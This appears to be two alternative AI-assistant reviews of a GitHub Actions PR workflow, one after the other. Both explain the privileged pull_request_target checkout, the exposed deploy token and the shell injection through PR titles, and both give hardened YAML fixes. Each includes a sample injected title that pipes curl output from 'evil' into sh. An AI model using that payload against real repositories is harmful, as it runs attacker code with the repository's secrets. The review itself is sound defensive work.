I haven't edited the file. Below are the problems I found and a corrected `pr-check.yml`.

## Problems

1. **`pull_request_target` with a checkout of the PR head, then `npm ci` and `./scripts/check.sh`.** This is the critical one. A fork's PR can change `package.json` (lifecycle scripts) or `check.sh`, and that code then runs with a write token and your secrets. `pull_request_target` is meant for privileged work that never touches PR code. It isn't a safe way to test a PR.
2. **`permissions: write-all`.** The job only needs to read the repo.
3. **`DEPLOY_TOKEN` is exposed to the test step.** The tests don't need it, and it's the secret an attacker would go after through problem 1. Untrusted PR code should never see it.
4. **Script injection in "Announce".** `${{ github.event.pull_request.title }}` is interpolated straight into the shell. A title like `"; curl evil|sh #` would execute. Untrusted values belong in `env:`.
5. **The comment step.** It needs `issues` or `pull-requests: write`, and on fork PRs a `pull_request` token is read-only, so it would fail. A "Checks passed." comment is also redundant with the check status. I replaced it with a job summary.
6. **Smaller hardening.**
   - `synchronize` and `opened` miss `reopened`.
   - There's no `persist-credentials: false`.
   - There's no timeout or concurrency control.
   - `checkout` with the head SHA isn't needed. `pull_request` checks out the merge commit by default.

## Corrected workflow

```yaml
name: PR check

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

concurrency:
  group: pr-check-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false

      - name: Announce
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Checking PR: $PR_TITLE"

      - name: Install and test
        run: |
          npm ci
          ./scripts/check.sh

      - name: Summary
        run: echo "Checks passed." >> "$GITHUB_STEP_SUMMARY"
```

## Notes

- **Secrets:** fork PRs don't get secrets under `pull_request`, and the check doesn't need any. If `DEPLOY_TOKEN` is used for deploys, keep that in a separate workflow that runs on `push` to `main`, ideally with an environment and approval rules.
- **PR comments from forks:** if you really want a comment, use a separate `workflow_run` workflow that has `pull-requests: write`. It must never check out or execute PR code, and it should treat any artifact from the PR run as untrusted data. I'd skip it unless you need it.
- **Action versions:** I kept `actions/checkout@v4` to match the repo's `@vN` tag convention. I didn't check whether a newer major exists, so run `gh release view --repo actions/checkout` if you want the latest.
- **Not verified:** I didn't run `actionlint` or execute the workflow. Hosted behavior, such as fork-token permissions, needs a real fork PR to confirm.
- **Secret rotation:** `DEPLOY_TOKEN` has been exposed to fork-controlled code on every run so far. Check the run history for suspicious PRs, and consider rotating it.

I haven't changed any files. The workflow has several serious problems, and I've put a corrected version below.

## Problems

1. **Untrusted code runs with privileges (critical).** `pull_request_target` runs in the base repo's context with secrets and a write token. Checking out `head.sha` and then running `npm ci` and `./scripts/check.sh` means a fork PR can edit `package.json` (for example a `postinstall` script) or `check.sh`. That code would run with your secrets and a write token. This is the classic "pwn request".
2. **`DEPLOY_TOKEN` is exposed to PR code.** A check job has no reason to hold a deploy secret.
3. **`permissions: write-all`** gives every step far more access than it needs.
4. **Script injection.** `${{ github.event.pull_request.title }}` is interpolated straight into the shell script. A title like `"; curl evil.sh | sh #` runs arbitrary commands. Pass it through `env:` instead.
5. **Smaller issues.** Actions are pinned to tags rather than SHAs. There's no `concurrency` group or timeout. The comment would be posted from a job that ran untrusted code. `checkout` also persists credentials by default.

## Corrected version

The fix splits the workflow in two. The first runs the untrusted code with no secrets and a read-only token. The second does the privileged commenting and never checks out or runs PR code.

`.github/workflows/pr-check.yml`
```yaml
name: PR check

on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: read

concurrency:
  group: pr-check-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4   # pin to a commit SHA in practice
        with:
          persist-credentials: false

      - name: Announce
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Checking PR: $PR_TITLE"

      - name: Install and test
        run: |
          npm ci
          ./scripts/check.sh

      - name: Save PR number
        run: echo "${{ github.event.pull_request.number }}" > pr-number.txt

      - uses: actions/upload-artifact@v4   # pin to a commit SHA in practice
        with:
          name: pr-result
          path: pr-number.txt
```

`.github/workflows/pr-comment.yml`
```yaml
name: PR comment

on:
  workflow_run:
    workflows: ["PR check"]
    types: [completed]

permissions:
  actions: read          # download the artifact
  pull-requests: write   # post the comment

jobs:
  comment:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/download-artifact@v4   # pin to a commit SHA in practice
        with:
          name: pr-result
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ github.token }}

      - uses: actions/github-script@v7   # pin to a commit SHA in practice
        with:
          script: |
            const fs = require('fs');
            const issue_number = parseInt(fs.readFileSync('pr-number.txt', 'utf8').trim(), 10);
            if (!Number.isInteger(issue_number)) throw new Error('Bad PR number');
            await github.rest.issues.createComment({
              ...context.repo,
              issue_number,
              body: "Checks passed.",
            });
```

## Notes

- **The artifact is untrusted input.** It comes from fork-controlled code, which is why the comment job parses it as an integer and does nothing else with it.
- **`workflow_run` only fires from the default branch.** Changes to `pr-comment.yml` take effect only after they're merged.
- **`DEPLOY_TOKEN` is no longer in the PR path.** If you need it for deploys, run that on `push` to `main` or in a protected environment with required reviewers.
- **Rotate `DEPLOY_TOKEN` if you can.** The old workflow has been exposed to any fork PR, so check the Actions logs for suspicious runs.
- **Repo settings to review.** Under Settings → Actions, set "Fork pull request workflows" to require approval for first-time contributors, and set the default `GITHUB_TOKEN` permission to read-only.
